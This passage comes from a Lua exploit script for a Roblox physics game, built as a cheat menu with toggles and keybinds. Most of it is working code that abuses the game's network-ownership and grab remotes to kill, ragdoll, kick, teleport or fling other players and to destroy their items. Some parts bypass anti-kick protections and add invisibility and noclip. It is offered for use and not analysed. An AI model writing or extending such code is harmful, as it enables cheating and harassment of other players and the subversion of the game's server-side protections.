    Callback = function(v) AttackFuncs.loopKillActive = v; if v then AttackFuncs.loopKillTask = task.spawn(LoopKillFunc) elseif AttackFuncs.loopKillTask then task.cancel(AttackFuncs.loopKillTask) end end
})

AttackMethodsGroupbox:AddToggle("SnowballRagdollToggle", {
    Text = "Snowball Ragdoll",
    Default = false,
    Callback = function(v)
        AttackFuncs.snowballRagdollActive = v
        if v then
            AttackFuncs.snowballRagdollTask = task.spawn(SnowballRagdollLoop)
        elseif AttackFuncs.snowballRagdollTask then
            task.cancel(AttackFuncs.snowballRagdollTask)
        end
    end
})

AttackExtrasGroupbox:AddLabel("Extra Features", true, Color3.fromRGB(0, 200, 100))


AttackExtrasGroupbox:AddDivider()
AttackExtrasGroupbox:AddLabel("Anti-AntiKick", true, Color3.fromRGB(255, 0, 255))

AttackExtrasGroupbox:AddToggle("AntiAntiKickWDToggle", {
    Text = "Anti-AntiKick[WD]", Default = false,
    Callback = function(v)
        AttackFuncs.antiAntiKickWDActive = v
        if v then
            AttackFuncs.antiAntiKickWDTask = task.spawn(AntiAntiKickWDFunc)
        elseif AttackFuncs.antiAntiKickWDTask then
            task.cancel(AttackFuncs.antiAntiKickWDTask)
            AttackFuncs.antiAntiKickWDTask = nil
            task.spawn(AAK_ClearWDToy)
        end
    end
})

AttackExtrasGroupbox:AddToggle("AntiAntiKickClickToggle", {
    Text = "Anti-AntiKick[CLICK]", Default = false,
    Callback = function(v)
        AttackFuncs.antiAntiKickClickActive = v
        if v then
            AttackFuncs.antiAntiKickClickTask = task.spawn(AntiAntiKickClickFunc)
        elseif AttackFuncs.antiAntiKickClickTask then
            task.cancel(AttackFuncs.antiAntiKickClickTask)
            AttackFuncs.antiAntiKickClickTask = nil
        end
    end
})

AttackExtrasGroupbox:AddToggle("AntiAntiKickBypassToggle", {
    Text = "Anti-AntiKick[BYPASS]", Default = false,
    Callback = function(v)
        AttackFuncs.antiAntiKickBypassActive = v
        if v then
            AttackFuncs.antiAntiKickBypassTask = task.spawn(AntiAntiKickBypassFunc)
        elseif AttackFuncs.antiAntiKickBypassTask then
            task.cancel(AttackFuncs.antiAntiKickBypassTask)
            AttackFuncs.antiAntiKickBypassTask = nil
        end
    end
})

AttackExtrasGroupbox:AddButton({
    Text = "Delete Blobman",
    Func = function()
        plr = Services.LocalPlayer
        folder = Services.Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
        if not folder then
            return
        end
        destroyed = 0
        for _, obj in ipairs(folder:GetChildren()) do
            if obj.Name == "CreatureBlobman" then
                pcall(function() Services.rs.MenuToys.DestroyToy:FireServer(obj) end)
                destroyed = destroyed + 1
            end
        end
        if destroyed > 0 then
        else
        end
    end
})

AttackExtrasGroupbox:AddButton({
    Text = "Break House Barriers",
    Func = function()
        breakhouse("auto")
    end
})

AttackExtrasGroupbox:AddButton("Destroy Gucci", function()
    DestroyGucci()
end)

AttackExtrasGroupbox:AddToggle("DestroyGucciLoopToggle", {
    Text = "Destroy Gucci Loop",
    Default = false,
    Callback = function(v)
        AttackFuncs.destroyGucciActive = v
        if v then
            AttackFuncs.destroyGucciTask = task.spawn(DestroyGucciLoop)
        elseif AttackFuncs.destroyGucciTask then
            task.cancel(AttackFuncs.destroyGucciTask)
        end
    end
})

Services.Players.PlayerAdded:Connect(function()
    task.wait(1); targetDropdown:SetValues(updateAttackPlayerList())
end)
Services.Players.PlayerRemoving:Connect(function()
    task.wait(0.5); targetDropdown:SetValues(updateAttackPlayerList())
end)

origCleanup = getgenv().KozmozLoadingCleanup
getgenv().KozmozLoadingCleanup = function()
    for k, v in pairs(AttackFuncs) do
        if type(v) == "boolean" then AttackFuncs[k] = false end
        if type(v) == "userdata" and tostring(v):find("thread") then task.cancel(v) end
    end
    BlobLock:Stop()
    SavedSafePosition = nil
    if origCleanup then origCleanup() end
end

AuraSettings = {
    Enabled = false,
    Range = 50,
    ScanRate = 0.2,
    LiftHeight = 20,
    LiftPower = 50,
    AutoDestroy = true,
    ShowNotifications = true,
    BringAllEnabled = false,
    WhitelistFriends = false
}

AuraState = {
    Active = false,
    TargetsInRange = {},
    CurrentBlobman = nil,
    ProcessingTarget = false,
    TimerStart = nil,
    TimerActive = false,
    BlackHoleTracking = {}
}

BringState = {
    Active = false,
    Queue = {},
    SavedPos = nil,
    SavedCamCFrame = nil,
    Radius = 100,
    Connection = nil
}

GameEvents = {
    DestroyToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy"),
    SetNetworkOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
    DestroyGrabLine = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("DestroyGrabLine")
}

camBlocker = Instance.new("Part", Workspace)
camBlocker.Anchored = true
camBlocker.CanCollide = false
camBlocker.Transparency = 1
camBlocker.CanQuery = false
camBlocker.Size = Vector3.new(10,10,10)

function freezeCamera()
    cam = Workspace.CurrentCamera
    camBlocker.CFrame = BringState.SavedCamCFrame
    camBlocker.Parent = Workspace
    cam.CameraType = Enum.CameraType.Scriptable
    cam.CFrame = BringState.SavedCamCFrame
end

function unfreezeCamera()
    camBlocker.Parent = nil
    cam = Workspace.CurrentCamera
    cam.CameraType = Enum.CameraType.Custom
    if BringState.SavedCamCFrame then
        cam.CFrame = BringState.SavedCamCFrame
    end
    BringState.SavedCamCFrame = nil
end

function disableCollisions(character)
    for _, part in pairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
        end
    end
end

function inPlot(player)
    plots = Workspace:FindFirstChild("PlotItems")
    playersInPlots = plots and plots:FindFirstChild("PlayersInPlots")
    return playersInPlots and playersInPlots:FindFirstChild(player.Name)
end

function inRadius(part)
    return (part.Position - BringState.SavedPos).Magnitude <= BringState.Radius
end

function shouldIgnore(player)
    if player == Services.LocalPlayer then return true end
    if AuraSettings.WhitelistFriends and Services.LocalPlayer:IsFriendsWith(player.UserId) then
        return true
    end
    return false
end

function refreshQueue()
    BringState.Queue = {}
    for _, player in pairs(Players:GetPlayers()) do
        if not shouldIgnore(player) and player.Character and not inPlot(player) then
            root = player.Character:FindFirstChild("HumanoidRootPart")
            if root and not inRadius(root) then
                table.insert(BringState.Queue, player)
            end
        end
    end
end

function processNext()
    if #BringState.Queue == 0 then
        refreshQueue()
        if #BringState.Queue == 0 then return end
    end
    target = BringState.Queue[1]
    table.remove(BringState.Queue, 1)
    if not target or not target.Character then return end
    root = target.Character:FindFirstChild("HumanoidRootPart")
    head = target.Character:FindFirstChild("Head")
    localRoot = Services.LocalPlayer.Character and Services.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if root and head and localRoot then
        Services.LocalPlayer.Character:PivotTo(root.CFrame * CFrame.new(0, -6, 0))
        disableCollisions(Services.LocalPlayer.Character)
        tries = 0
        repeat
            GameEvents.SetNetworkOwner:FireServer(root, localRoot.CFrame)
            task.wait(0)
            tries = tries + 2
            if tries > 40 then break end
        until (head:FindFirstChild("PartOwner") and head.PartOwner.Value == Services.LocalPlayer.Name) or not BringState.Active
        if BringState.Active and head:FindFirstChild("PartOwner") and head.PartOwner.Value == Services.LocalPlayer.Name then
            root.CFrame = CFrame.new(BringState.SavedPos)
            root.Position = BringState.SavedPos
            root.AssemblyLinearVelocity = Vector3.zero
            task.wait(0)
        end
    end
end

function startBringAll()
    localRoot = Services.LocalPlayer.Character and Services.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not localRoot then return end
    BringState.SavedPos = localRoot.Position
    BringState.SavedCamCFrame = Workspace.CurrentCamera.CFrame
    refreshQueue()
    freezeCamera()
    BringState.Connection = RunService.Heartbeat:Connect(function()
        if BringState.Active then
            processNext()
            if BringState.SavedCamCFrame then
                cam = Workspace.CurrentCamera
                cam.CameraType = Enum.CameraType.Scriptable
                cam.CFrame = BringState.SavedCamCFrame
                camBlocker.CFrame = BringState.SavedCamCFrame
                camBlocker.Parent = Workspace
            end
        end
    end)
end

function stopBringAll()
    if BringState.Connection then
        BringState.Connection:Disconnect()
        BringState.Connection = nil
    end
    unfreezeCamera()
    localRoot = Services.LocalPlayer.Character and Services.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if localRoot and BringState.SavedPos then
        localRoot.AssemblyLinearVelocity = Vector3.zero
        localRoot.CFrame = CFrame.new(BringState.SavedPos)
    end
end

AurasGeneral = Tabs.AurasTab:AddLeftGroupbox("General Auras", "loader")

auraSpeed = 100
auraBodies, auraCoroutine = {}, nil

AurasGeneral:AddToggle("AirSuspendAuraToggle", {
    Text = 'Air Suspend Aura',
    Default = false,
    Callback = function(enabled)
        if enabled then
            auraCoroutine = coroutine.create(function()
                while task.wait(0.02) do
                    c = Services.LocalPlayer.Character
                    hrp = c and c:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        for _, player in pairs(Players:GetPlayers()) do
                            if player ~= Services.LocalPlayer and player.Character then
                                root = player.Character:FindFirstChild("Torso") or player.Character:FindFirstChild("HumanoidRootPart")
                                if root then
                                    bv = auraBodies[player]
                                    if not bv or not bv.Parent then
                                        bv = Instance.new("BodyVelocity")
                                        bv.Name = "AirSuspendBV"
                                        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        bv.Parent = root
                                        auraBodies[player] = bv
                                    end
                                    bv.Velocity = Vector3.new(0, auraSpeed, 0)
                                    pcall(function() SetNetworkOwner:FireServer(root, root.CFrame) end)
                                end
                            end
                        end
                    end
                end
            end)
            coroutine.resume(auraCoroutine)
        else
            if auraCoroutine then coroutine.close(auraCoroutine) auraCoroutine = nil end
            for _, bv in pairs(auraBodies) do if bv and bv.Parent then bv:Destroy() end end
            auraBodies = {}
        end
    end
})

local function GetLookedPlayer()
    myChar = Services.LocalPlayer.Character
    if not myChar then return nil end
    camera = workspace.CurrentCamera
    rayOrigin = camera.CFrame.Position
    rayDirection = camera.CFrame.LookVector * 1000
    params = RaycastParams.new()
    params.FilterDescendantsInstances = {myChar}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    result = workspace:Raycast(rayOrigin, rayDirection, params)
    if result then
        hitModel = result.Instance:FindFirstAncestorOfClass("Model")
        if hitModel then
            return Services.Players:GetPlayerFromCharacter(hitModel)
        end
    end
    return nil
end

local function GetObjectName(obj)
    if not obj then return "Unknown" end
    local model = obj:FindFirstAncestorWhichIsA("Model")
    if model and model.Name then return model.Name end
    return obj.Name or "Unknown"
end

local function BringTarget(target, targetType)
    if not target then return end
    myChar = Services.LocalPlayer.Character
    myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    savedPos = myRoot.CFrame
    if targetType == "player" then
        if not target.Character then return end
        tRoot = target.Character:FindFirstChild("HumanoidRootPart")
        tHum = target.Character:FindFirstChild("Humanoid")
        if not tRoot or not tHum then return end
        myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 2.5)
        myRoot.AssemblyLinearVelocity = Vector3.zero
        task.wait(0.05)
        for i = 1, 8 do
            pcall(function() Services.SetNetOwner:FireServer(tRoot, tRoot.CFrame) end)
            task.wait(0.01)
        end
        for i = 1, 4 do
            pcall(function() Services.DestroyLine:FireServer(tRoot) end)
            task.wait(0.01)
        end
        tRoot.CFrame = savedPos * CFrame.new(0, 0, -7)
        tRoot.AssemblyLinearVelocity = Vector3.zero
        pcall(function() tHum.PlatformStand = true end)
        task.wait(0.05)
        myRoot.CFrame = savedPos
        myRoot.AssemblyLinearVelocity = Vector3.zero
    elseif targetType == "toy" then
        if not target.Parent then return end
        root = target.AssemblyRootPart or target
        if not root then return end
        if root.Locked then
            local isMapPart = false
            pcall(function()
                if root:IsDescendantOf(workspace.Map) then
                    isMapPart = true
                end
            end)
            if isMapPart then
                return
            end
        end
        if root.Anchored then root.Anchored = false end
        myRoot.CFrame = root.CFrame * CFrame.new(0, 0, 2)
        myRoot.AssemblyLinearVelocity = Vector3.zero
        task.wait(0.1)
        for i = 1, 6 do
            pcall(function() Services.SetNetOwner:FireServer(root, root.CFrame) end)
            task.wait(0.01)
        end
        for i = 1, 4 do
            pcall(function() Services.DestroyLine:FireServer(root) end)
            task.wait(0.01)
        end
        root.CFrame = savedPos * CFrame.new(0, 0, -7)
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
        task.wait(0.05)
        myRoot.CFrame = savedPos
        myRoot.AssemblyLinearVelocity = Vector3.zero
        local objName = GetObjectName(root)
    end
end

local function KillTarget(target)
    if not target or not target.Character then return end
    tRoot = target.Character:FindFirstChild("HumanoidRootPart")
    tHum = target.Character:FindFirstChild("Humanoid")
    myChar = Services.LocalPlayer.Character
    myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not tRoot or not tHum or not myRoot then return end
    if tHum.Health <= 0 then return end
    savedPos = myRoot.CFrame
    for i = 1, 5 do
        pcall(function() Services.CreateLine:FireServer(tRoot) end)
        task.wait(0.02)
    end
    myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 2.5)
    myRoot.AssemblyLinearVelocity = Vector3.zero
    task.wait(0.05)
    for i = 1, 8 do
        pcall(function() Services.SetNetOwner:FireServer(tRoot, tRoot.CFrame) end)
        task.wait(0.01)
    end
    for i = 1, 5 do
        pcall(function() Services.DestroyLine:FireServer(tRoot) end)
        task.wait(0.01)
    end
    pcall(function()
        tHum:ChangeState(Enum.HumanoidStateType.Physics)
        tRoot.AssemblyLinearVelocity = Vector3.new(0, -300, 0)
        tRoot.AssemblyAngularVelocity = Vector3.new(100, 100, 100)
        target.Character:BreakJoints()
        task.wait()
        tRoot.AssemblyLinearVelocity = Vector3.zero
        tRoot.AssemblyAngularVelocity = Vector3.zero
    end)
    task.wait(0.1)
    pcall(function()
        myRoot.CFrame = savedPos
        myRoot.AssemblyLinearVelocity = Vector3.zero
    end)
end

local function RagdollTarget(target)
    if not target or not target.Character then return end
    plr = Services.Players.LocalPlayer
    spawnedToys = Services.Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
    tRoot = target.Character:FindFirstChild("HumanoidRootPart")
    myChar = Services.LocalPlayer.Character
    myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not tRoot or not myRoot then return end
    savedPos = myRoot.CFrame
    myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 2.5)
    myRoot.AssemblyLinearVelocity = Vector3.zero
    task.wait(0.05)
    for i = 1, 8 do
        pcall(function() Services.SetNetOwner:FireServer(tRoot, tRoot.CFrame) end)
        task.wait(0.01)
    end
    for i = 1, 5 do
        pcall(function() Services.DestroyLine:FireServer(tRoot) end)
        task.wait(0.01)
    end
    ragdoll = spawnedToys and spawnedToys:FindFirstChild("Ragdoll")
    if ragdoll then
        firetouchinterest(ragdoll.SoundPart, target.Character.Head, 0)
    end
    task.wait(0.1)
    pcall(function()
        myRoot.CFrame = savedPos
        myRoot.AssemblyLinearVelocity = Vector3.zero
    end)
end

local function KickTarget(target)
    if not target or not target.Character then 
        return 
    end
    tn = target.Name
    if not tn or not checkBlob() then return end
    plr = Services.LocalPlayer
    char = plr.Character
    hum = char:FindFirstChild("Humanoid")
    hrp = char:FindFirstChild("HumanoidRootPart")
    seat = hum and hum.SeatPart
    if not seat or seat.Parent.Name ~= "CreatureBlobman" then
        return
    end
    blob = seat.Parent
    blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
    bs = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if not bs then return end
    CG = bs:FindFirstChild("CreatureGrab")
    CD = bs:FindFirstChild("CreatureDrop")
    R_Det = blob:FindFirstChild("RightDetector")
    if not CG or not CD or not R_Det then return end
    GE = Services.rs.GrabEvents
    tChar = target.Character
    tRoot = tChar:FindFirstChild("HumanoidRootPart")
    tHum = tChar:FindFirstChild("Humanoid")
    if not tRoot or not tHum then return end
    existingWeld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
    if existingWeld then
        CD:FireServer(existingWeld)
        task.wait(0.2)
    end
    savedPos = blobRoot.CFrame
    dragging = false
    grabStartTime = 0
    loopStartTime = tick()
    blobRoot.CFrame = tRoot.CFrame
    task.wait(0.1)
    while tick() - loopStartTime < 1 do
        ok, err = pcall(function()
            if not target or not target.Character then dragging = false; return end
            tRoot = target.Character:FindFirstChild("HumanoidRootPart")
            tHum = target.Character:FindFirstChild("Humanoid")
            if not tRoot or not tHum or tHum.Health <= 0 then dragging = false; return end
            pcall(function() tRoot.Velocity = Vector3.zero end)
            if not dragging then
                pcall(function() blobRoot.CFrame = tRoot.CFrame end)
                pcall(function() blobRoot.Velocity = Vector3.zero end)
                pcall(function()
                    tHum.PlatformStand = true
                    tHum.Sit = true
                    GE.SetNetworkOwner:FireServer(tRoot, blobRoot.CFrame)
                    GE.DestroyGrabLine:FireServer(tRoot)
                end)
                if grabStartTime == 0 then grabStartTime = tick() end
                if tick() - grabStartTime > 0.1 then
                    dragging = true
                    grabStartTime = 0
                    pcall(function() blobRoot.CFrame = savedPos end)
                    pcall(function() blobRoot.Velocity = Vector3.zero end)
                end
            else
                pcall(function() blobRoot.CFrame = savedPos end)
                pcall(function() blobRoot.Velocity = Vector3.zero end)
                lockPos = savedPos * CFrame.new(0, 23, 0)
                pcall(function() tRoot.CFrame = lockPos end)
                pcall(function() tHum.PlatformStand = true; tHum.Sit = true end)
                pcall(function()
                    GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                    GE.DestroyGrabLine:FireServer(tRoot)
                    weld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
                    if weld then 
                        CG:FireServer(R_Det, tRoot, weld) 
                    else
                        CG:FireServer(R_Det, tRoot)
                    end
                end)
            end
        end)
        if not ok then dragging = false end
        Services.RunService.Heartbeat:Wait()
    end
    holdPos = savedPos * CFrame.new(0, 3, -5)
    pcall(function()
        tRoot.CFrame = holdPos
        tRoot.Velocity = Vector3.zero
        tRoot.RotVelocity = Vector3.zero
        tHum.PlatformStand = true
    end)
end

KB = {
    Bring = {
        Name = "Bring",
        Key = Enum.KeyCode.N,
        Waiting = false,
        Label = nil,
        Color = "rgb(0, 45, 248)",
        Icon = "hand",
        Func = function(target) BringTarget(target) end
    },
    Kill = {
        Name = "Kill",
        Key = Enum.KeyCode.M,
        Waiting = false,
        Label = nil,
        Color = "rgb(0, 45, 248)",
        Icon = "sword",
        Func = function(target) KillTarget(target) end
    },
    Ragdoll = {
        Name = "Ragdoll",
        Key = Enum.KeyCode.R,
        Waiting = false,
        Label = nil,
        Color = "rgb(0, 45, 248)",
        Icon = "user",
        Func = function(target) RagdollTarget(target) end
    },
    Kick = {
        Name = "Kick",
        Key = Enum.KeyCode.K,
        Waiting = false,
        Label = nil,
        Color = "rgb(0, 45, 248)",
        Icon = "hand",
        Func = function(target) KickTarget(target) end
    }
}

KBGroup = Tabs.KeybindsTab:AddLeftGroupbox("Keybinds", "hand")

for i, kb in pairs(KB) do
    KBGroup:AddLabel(kb.Name, true)
    keyName = string.gsub(tostring(kb.Key), "Enum.KeyCode.", "")
    kb.Label = KBGroup:AddLabel('<font color="' .. kb.Color .. '">Current Keybind: ' .. keyName .. '</font>')
    KBGroup:AddButton({
        Text = "Change " .. kb.Name .. " Keybind",
        Func = function()
            kb.Waiting = true
        end
    })
    if kb.Name == "Ragdoll" then
        KBGroup:AddButton({
            Text = "Setup Ragdoll Grab",
            Func = function()
                plr = Services.Players.LocalPlayer
                spawnedToys = Services.Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
                if spawnedToys:FindFirstChild("Ragdoll") then
                    return
                end
                head = plr.Character:WaitForChild("Head")
                headup = CFrame.new(head.Position + Vector3.new(0, 1, 0), head.Position) * CFrame.Angles(math.pi, 0, 0)
                Services.SpawnToy:InvokeServer("PalletLightBrown", headup, Vector3.new(0, 0, 0))
                v1150 = nil
                startTime = tick()
                repeat
                    for _, toy in pairs(spawnedToys:GetChildren()) do
                        if toy.Name == "PalletLightBrown" and toy:FindFirstChild("SoundPart") then
                            v1150 = toy
                            break
                        end
                    end
                    task.wait()
                until v1150 or (tick() - startTime > 5)
                if not v1150 then
                    return
                end
                v1151 = v1150.SoundPart
                while (not v1151:FindFirstChild("PartOwner")) or (v1151:FindFirstChild("PartOwner") and (v1151.PartOwner.Value ~= plr.Name)) do
                    task.spawn(function()
                        Services.SetNetOwner:FireServer(v1151, v1151.CFrame)
                    end)
                    task.wait()
                end
                v1152 = Instance.new("BodyVelocity")
                v1152.Parent = v1151
                v1152.MaxForce = Vector3.new(0, math.huge, 0)
                v1152.Velocity = Vector3.new(0, 1000, 0)
                for _, v1308 in pairs(v1150:GetChildren()) do
                    if v1308:IsA("BasePart") then
                        v1308.Transparency = 1
                        v1308.Size = Vector3.new(0.5, 0.5, 0.5)
                    end
                end
                if v1151:FindFirstChild("Wood") then
                    v1151.Wood:Destroy()
                end
                v1150.Name = "Ragdoll"
                inv.ragdoll = v1150
            end
        })
    end
    KBGroup:AddDivider()
end

-- =====================================================================
-- [KOZMOZ PORT] Keybinds kutusu: musa'nin kisayol listesi (14) + Zoom
-- musa(4) kaynagindan tasiindi; Obsidian elemanlarina uyarlandi ve
-- musa'daki davranisin tamami (durum + yardimci fonksiyonlar) korundu.
-- =====================================================================
do
    local function applyScreenStretch(cf)
        if not KozFlags.screenStretchEnabled then return cf end
        local t = KozFlags.screenStretchIntensity / 500
        if t <= 0 then return cf end
        local right = cf.RightVector
        local up = cf.UpVector
        local r = right.Magnitude
        local u = up.Magnitude
        if r > 0.001 then right = right / r end
        if u > 0.001 then up = up / u end
        return CFrame.fromMatrix(cf.Position, right * (1 + t * 0.2), up * (1 - t * 0.35), -cf.LookVector)
    end
    local function setCamCFrame(cf)
        local cam = KozWS.CurrentCamera
        if cam then cam.CFrame = applyScreenStretch(cf) end
    end

    local pvpSafeEnabled = false
    local pvpSafePlatform = nil
    KBGroup:AddLabel("PVP SAFE"):AddKeyPicker("KozPvpSafe", {
        Text = "PVP SAFE",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            local char = KozPLR.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if not hrp or not hum then return end
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
            if pvpSafePlatform then pvpSafePlatform:Destroy() end
            pvpSafePlatform = Instance.new("Part")
            pvpSafePlatform.Name = "PVPSafePlatform"
            pvpSafePlatform.Size = Vector3.new(0.625, 0.0625, 0.625)
            pvpSafePlatform.Position = hrp.Position - Vector3.new(0, 3, 0)
            pvpSafePlatform.Anchored = true
            pvpSafePlatform.CanCollide = true
            pvpSafePlatform.Material = Enum.Material.SmoothPlastic
            pvpSafePlatform.BrickColor = BrickColor.new("Dark stone grey")
            pvpSafePlatform.Transparency = 0.6
            pvpSafePlatform.Parent = KozWS
            hrp.CFrame = CFrame.new(pvpSafePlatform.Position + Vector3.new(0, 3, 0))
            task.delay(5, function()
                    if pvpSafePlatform and pvpSafePlatform.Parent then
                        pvpSafePlatform:Destroy()
                        pvpSafePlatform = nil
                    end
                end)
        end
    })
    local legitPvpSafeActive = false
    local legitPvpSafeTask = nil
    KBGroup:AddLabel("Legit PVP Safe"):AddKeyPicker("KozLegitPvpSafe", {
        Text = "Legit PVP Safe",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            if legitPvpSafeActive then return end
            legitPvpSafeActive = true
            legitPvpSafeTask = task.spawn(function()
                    local char = KozPLR.Character
                    if not char then legitPvpSafeActive = false return end
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if not hrp then legitPvpSafeActive = false return end
                    local startVel = hrp.AssemblyLinearVelocity
                    local startAng = hrp.AssemblyAngularVelocity
                    local stopSpeed = 20 + math.random(-5, 5)
                    local stopVel = startVel.Unit * stopSpeed
                    for i = 1, 30 do
                        local t = i / 30
                        local yt = i / 60
                        hrp.AssemblyLinearVelocity = Vector3.new(
                            startVel.X + (stopVel.X - startVel.X) * t,
                            startVel.Y + (stopVel.Y - startVel.Y) * yt,
                            startVel.Z + (stopVel.Z - startVel.Z) * t
                        )
                        hrp.AssemblyAngularVelocity = startAng:Lerp(Vector3.zero, t)
                        task.wait()
                    end
                    hrp.AssemblyLinearVelocity = stopVel
                    hrp.AssemblyAngularVelocity = Vector3.zero
                    for _ = 1, 10 do
                        hrp.AssemblyLinearVelocity = stopVel
                        hrp.AssemblyAngularVelocity = Vector3.zero
                        task.wait()
                    end
                    legitPvpSafeActive = false
                end)
        end
    })
    do
    local palletPvpSafeActive = false
    local palletPvpSafeConn = nil
    local palletPvpSafePallet = nil
    local palletPvpSafeTarget = nil
    KBGroup:AddLabel("Pallet PVP Safe"):AddKeyPicker("KozPalletPvpSafe", {
        Text = "Pallet PVP Safe",
        Default = "None",
        Mode = "Toggle",
        Callback = function(held)
            if held then
                if palletPvpSafeActive then return end
                palletPvpSafeActive = true
                local char = KozPLR.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if not hrp then palletPvpSafeActive = false return end
                local folder = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
                if not folder then palletPvpSafeActive = false return end
                local spawnCFrame = hrp.CFrame * CFrame.new(0, 0, -5)
                palletPvpSafeConn = folder.ChildAdded:Connect(function(toy)
                        if toy.Name == "PalletLightBrown" then
                            local main = toy:FindFirstChild("Main")
                            if not main then
                                local t = tick() + 3
                                repeat
                                    task.wait()
                                    main = toy:FindFirstChild("Main")
                                until main or not toy.Parent or tick() > t
                            end
                            if main then
                                palletPvpSafePallet = toy
                                palletPvpSafeTarget = main
                            end
                        end
                    end)
                task.spawn(function()
                        while palletPvpSafeActive do
                            local cam = KozWS.CurrentCamera
                            if cam then
                                local target = palletPvpSafeTarget
                                if not target or not target.Parent then
                                    palletPvpSafePallet = nil
                                    palletPvpSafeTarget = nil
                                end
                                target = palletPvpSafeTarget
                                if target and target.Parent then
                                    local camPos = cam.CFrame.Position
                                    local factor = math.min(1, 8 / (KozFlags.LegitAimSmoothness or 12))
                                    local targetCFrame = CFrame.lookAt(camPos, target.Position)
                                    setCamCFrame(cam.CFrame:Lerp(targetCFrame, factor))
                                end
                            end
                            KozRun.RenderStepped:Wait()
                        end
                    end)
                pcall(function() KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "PalletLightBrown", spawnCFrame, Vector3.new(0, 0, 0)) end)
            else
                palletPvpSafeActive = false
                if palletPvpSafeConn then
                    palletPvpSafeConn:Disconnect()
                    palletPvpSafeConn = nil
                end
                palletPvpSafePallet = nil
                palletPvpSafeTarget = nil
            end
        end
    })
    end
    _G.Invisibility = _G.Invisibility or {}
    _G.Invisibility.noclipEnabled = false
    _G.Invisibility.cameraOffset = 10
    _G.Invisibility.undergroundDepthOffset = 20
    _G.Invisibility.initialized = false
    _G.Invisibility.originalPosition = nil
    _G.Invisibility.originalCameraCFrame = nil
    _G.Invisibility.noclipConnection = nil
    _G.Invisibility.humanoidRootPartTransparency = nil
    _G.Invisibility.camera = KozWS.CurrentCamera
    local function updateInvisCharacter(char)
        if not char then return end
        _G.Invisibility.character = char
        task.spawn(function()
            _G.Invisibility.humanoidRootPart = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 5)
            _G.Invisibility.head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
        end)
    end
    if KozPLR.Character then
        updateInvisCharacter(KozPLR.Character)
    end
    _G.Invisibility.setNoclip = function(enabled)
        if enabled then
            _G.Invisibility.noclipConnection = KozRun.Stepped:Connect(function()
                for _, part in pairs(_G.Invisibility.character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end)
        elseif _G.Invisibility.noclipConnection then
            _G.Invisibility.noclipConnection:Disconnect()
            _G.Invisibility.noclipConnection = nil
        end
    end
    _G.Invisibility.setHumanoidRootPartTransparency = function(transparency)
        if _G.Invisibility.humanoidRootPart then
            _G.Invisibility.humanoidRootPart.Transparency = transparency
        end
    end
    _G.Invisibility.toggleNoclip = function(enabled)
        if _G.Invisibility.noclipEnabled ~= enabled then
            _G.Invisibility.noclipEnabled = enabled
            if _G.Invisibility.noclipEnabled then
                _G.Invisibility.originalPosition = _G.Invisibility.humanoidRootPart.Position
                _G.Invisibility.originalCameraCFrame = _G.Invisibility.camera.CFrame
                _G.Invisibility.humanoidRootPartTransparency = _G.Invisibility.humanoidRootPart.Transparency
                _G.Invisibility.setHumanoidRootPartTransparency(1)
                _G.Invisibility.setNoclip(true)
                local characterHeight = _G.Invisibility.originalPosition.Y
                local cameraTargetHeight = characterHeight + _G.Invisibility.cameraOffset
                local undergroundDepth = cameraTargetHeight - _G.Invisibility.undergroundDepthOffset
                local undergroundPos = Vector3.new(_G.Invisibility.originalPosition.X, undergroundDepth, _G.Invisibility.originalPosition.Z)
                _G.Invisibility.humanoidRootPart.CFrame = CFrame.new(undergroundPos)
                local currentCameraCF = _G.Invisibility.camera.CFrame
                local cameraPos = Vector3.new(undergroundPos.X, cameraTargetHeight, undergroundPos.Z)
                _G.Invisibility.camera.CFrame = applyScreenStretch(CFrame.new(cameraPos, cameraPos + currentCameraCF.LookVector))
            else
                _G.Invisibility.setNoclip(false)
                local surfacePos = Vector3.new(_G.Invisibility.humanoidRootPart.Position.X, _G.Invisibility.originalPosition.Y, _G.Invisibility.humanoidRootPart.Position.Z)
                _G.Invisibility.humanoidRootPart.CFrame = CFrame.new(surfacePos)
                _G.Invisibility.setHumanoidRootPartTransparency(_G.Invisibility.humanoidRootPartTransparency or 0)
            end
        end
    end
    KozRun.Heartbeat:Connect(function()
        if _G.Invisibility.noclipEnabled and _G.Invisibility.originalPosition then
